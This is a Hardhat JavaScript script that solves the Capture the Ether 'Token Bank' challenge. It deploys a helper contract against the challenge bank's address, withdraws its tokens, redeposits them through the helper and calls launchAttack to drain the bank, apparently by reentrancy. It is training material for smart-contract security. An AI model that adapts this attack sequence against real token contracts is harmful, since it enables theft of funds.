const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");


async function main() {
    let bankABI = [
        { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "withdraw", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" },
        { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" },
        { "constant": true, "inputs": [], "name": "isComplete", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" },
        { "constant": false, "inputs": [{ "name": "from", "type": "address" }, { "name": "value", "type": "uint256" }, { "name": "", "type": "bytes" }], "name": "tokenFallback", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" },
        { "constant": true, "inputs": [], "name": "token", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" },
        { "inputs": [{ "name": "player", "type": "address" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }
    ];

    let tokenABI = [
        { "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" },
        { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, {"name": "value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "success", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function" },
        { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{"name": "", "type": "uint256"}],"payable": false, "stateMutability": "view","type": "function"},
        { "constant": false, "inputs": [{"name": "from", "type": "address"}, {"name": "to", "type": "address"},{"name": "value", "type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "success", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function"},
        { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function"},
        { "constant": true, "inputs": [{ "name": "", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function" },
        { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string"}], "payable": false, "stateMutability": "view", "type": "function" },
        { "constant": false, "inputs": [{ "name": "to", "type": "address" }, {"name": "value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function"},
        { "constant": false, "inputs": [{ "name": "to", "type": "address" }, { "name": "value", "type": "uint256" }, {"name": "data", "type": "bytes"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function"},
        { "constant": true, "inputs": [{ "name": "","type": "address"}, {"name": "", "type": "address"}], "name": "allowance", "outputs": [{"name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function"},
        { "inputs": [], "payable": false,"stateMutability": "nonpayable", "type": "constructor" }, 
        { "anonymous": false, "inputs": [{ "indexed": true,"name": "from", "type": "address"},{"indexed": true, "name": "to", "type": "address"},{"indexed": false, "name": "value", "type": "uint256"}], "name": "Transfer", "type": "event"},
        { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, {"indexed": true, "name": "spender", "type": "address"}, {"indexed": false, "name": "value", "type": "uint256"}], "name": "Approval", "type": "event"}
    ];

    const [signer] = await ethers.getSigners();
    console.log("SIGNER: ", signer.address);
    console.log("---------------");

    //So we don't have to repeat the calculation
    const ourTokenBalance = BigNumber.from(500000).mul(BigNumber.from(10).pow(18));

    //The contract address - Just copy it from the CTE challenge page
    const challengeBankAddress = await ethers.utils.getAddress("0x812fA2EE733d7300112a0b145Add46E5b049A4BC");

    //Deploy the solver contract using your account
    console.log("Deploying contract with the account:", signer.address);
    const TokenBankHelperContractFactory = await ethers.getContractFactory("TokenBankHelper");
    const TokenBankHelperContract = await TokenBankHelperContractFactory.deploy(challengeBankAddress);
    console.log("Token Bank Helper Contract address:", TokenBankHelperContract.address);
    console.log("---------------");

    //Get the challenge bank contract
    var cteBankContract = new ethers.Contract(challengeBankAddress, bankABI, signer);
    console.log("GOT THE BANK CONTRACT");
    console.log("---------------");

    const bankTokenAddress = await cteBankContract.token();

    //Get the token contract that the bank is using
    var cteTokenContract = new ethers.Contract(bankTokenAddress, tokenABI, signer);
    console.log("GOT THE BANK TOKEN CONTRACT");
    console.log("---------------");

    //Transfer our own funds to the Token Bank Helper
    //First we withdraw our funds
    let withdrawTx = await cteBankContract.withdraw(ourTokenBalance);
    let withdrawTxReceipt = await withdrawTx.wait();
    console.log("WE HAVE WITHDRAWN OUR FUNDS: ", withdrawTxReceipt);
    console.log("---------------");

    //Now send them to our helper contract;
    let transferTx = await cteTokenContract["transfer(address,uint256)"](TokenBankHelperContract.address, ourTokenBalance);
    let transferTxReceipt = await transferTx.wait();
    console.log("TRANSFER MADE: ", transferTxReceipt);
    console.log("---------------");

    //Now let's have our contract deposit them in the bank
    let depositTx = await TokenBankHelperContract.deposit();
    let depositTxReceipt = await depositTx.wait();
    console.log("DEPOSIT MADE: ", depositTxReceipt);
    console.log("---------------");

    //Launch attack
    let launchAttackTx = await TokenBankHelperContract.launchAttack();
    let launchAttackTxReceipt = await launchAttackTx.wait();
    console.log("OUR ATTACK SUCCEEDED: ", launchAttackTxReceipt);

}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error);
        process.exit(1);
    });